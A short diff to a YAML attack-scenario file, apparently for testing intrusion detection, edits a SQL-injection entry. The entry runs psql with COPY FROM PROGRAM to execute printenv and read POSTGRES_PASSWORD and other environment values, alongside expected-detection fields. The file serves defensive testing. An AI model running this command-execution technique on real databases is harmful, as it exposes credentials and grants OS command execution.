@@ -122,7 +122,7 @@ attacks:
     type: sqli
     exec:
       command: ["psql", "-tAc",
-                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'printenv POSTGRES_PASSWORD PGDATA HOSTNAME'; SELECT * FROM cmd_out;"]
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'printenv POSTGRES_PASSWORD PGDATA HOSTNAME; true'; SELECT * FROM cmd_out;"]
     successIndicators:
       - bodyContains: "postgresql"
     expectedDetections:
